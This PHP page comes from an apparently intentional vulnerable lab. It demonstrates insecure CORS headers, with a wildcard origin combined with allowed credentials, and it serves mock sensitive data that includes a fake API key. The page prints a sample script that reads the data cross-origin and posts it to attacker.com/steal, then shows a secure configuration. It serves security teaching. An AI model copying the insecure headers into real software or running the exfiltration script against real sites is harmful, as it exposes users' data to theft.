<?php
// HTTP Headers Vulnerability Example - Insecure CORS

// Set insecure CORS headers
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Max-Age: 86400");

// Sample API data that should be protected
$sensitive_data = [
    "user_id" => 1234,
    "username" => "admin",
    "email" => "admin@example.com",
    "api_key" => "sk_live_51KjHdGHJK29d8sMN3PQRsTUVwXyZ",
    "account_balance" => 12500.75
];

// Return JSON if requested via AJAX
if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest') {
    header('Content-Type: application/json');
    echo json_encode($sensitive_data);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Insecure CORS Headers - Pentora Vulnerable Lab</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container mt-5">
        <h1>Insecure CORS Headers</h1>
        <div class="alert alert-danger">
            <strong>Warning:</strong> This page intentionally uses insecure CORS headers for demonstration purposes.
        </div>

        <div class="row">
            <div class="col-md-6">
                <div class="card mb-4">
                    <div class="card-header">
                        <h5>Current CORS Headers</h5>
                    </div>
                    <div class="card-body">
                        <p>This page is sending the following insecure CORS headers:</p>
                        <ul>
                            <li><code>Access-Control-Allow-Origin: *</code> - Allows any domain to access this resource</li>
                            <li><code>Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS</code> - Allows all HTTP methods</li>
                            <li><code>Access-Control-Allow-Headers: *</code> - Allows any headers to be sent</li>
                            <li><code>Access-Control-Allow-Credentials: true</code> - Allows sending credentials (cookies, auth headers)</li>
                            <li><code>Access-Control-Max-Age: 86400</code> - Caches preflight requests for 24 hours</li>
                        </ul>
                        <div class="alert alert-warning">
                            <strong>Security Issue:</strong> The combination of <code>Access-Control-Allow-Origin: *</code> and <code>Access-Control-Allow-Credentials: true</code> is particularly dangerous as it allows any website to make authenticated requests to this API.
                        </div>
                    </div>
                </div>
            </div>

            <div class="col-md-6">
                <div class="card mb-4">
                    <div class="card-header">
                        <h5>API Data</h5>
                    </div>
                    <div class="card-body">
                        <p>This page simulates an API that returns sensitive user data:</p>
                        <pre id="api-data"><?php echo json_encode($sensitive_data, JSON_PRETTY_PRINT); ?></pre>
                        <p>Due to the insecure CORS configuration, this data can be accessed by any website via JavaScript.</p>
                        <button class="btn btn-primary" id="fetch-data">Fetch API Data</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="card mb-4">
            <div class="card-header">
                <h5>Exploit Example</h5>
            </div>
            <div class="card-body">
                <p>Here's how a malicious website could exploit these insecure CORS headers:</p>
                <pre class="bg-dark text-light p-3">
&lt;!-- Malicious website code -->
&lt;script>
    // This code can be run from any domain
    fetch('<?php echo "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?>', {
        method: 'GET',
        headers: {
            'X-Requested-With': 'XMLHttpRequest'
        },
        credentials: 'include' // Sends cookies if they exist
    })
    .then(response => response.json())
    .then(data => {
        // Steal sensitive data
        console.log('Stolen data:', data);
        
        // Send it to attacker's server
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    });
&lt;/script>
                </pre>
            </div>
        </div>

        <div class="card mb-4">
            <div class="card-header">
                <h5>Secure CORS Configuration</h5>
            </div>
            <div class="card-body">
                <p>A secure CORS configuration would look like this:</p>
                <pre class="bg-dark text-light p-3">
// Specific origin instead of wildcard
header("Access-Control-Allow-Origin: https://trusted-site.com");

// Only allow necessary methods
header("Access-Control-Allow-Methods: GET, POST");

// Only allow specific headers
header("Access-Control-Allow-Headers: Content-Type, Authorization");

// Be careful with credentials
header("Access-Control-Allow-Credentials: true");

// Shorter preflight cache
header("Access-Control-Max-Age: 3600");
                </pre>
                <p>Key security principles:</p>
                <ul>
                    <li>Never use <code>*</code> with <code>Access-Control-Allow-Credentials: true</code></li>
                    <li>Only allow trusted origins</li>
                    <li>Limit methods and headers to what's necessary</li>
                    <li>Consider using a CORS whitelist for multiple trusted domains</li>
                </ul>
            </div>
        </div>
        
        <a href="index.php" class="btn btn-secondary mb-4">Back to HTTP Headers Tests</a>
    </div>

    <script>
        document.getElementById('fetch-data').addEventListener('click', function() {
            fetch(window.location.href, {
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('api-data').textContent = JSON.stringify(data, null, 2);
            })
            .catch(error => {
                console.error('Error:', error);
            });
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
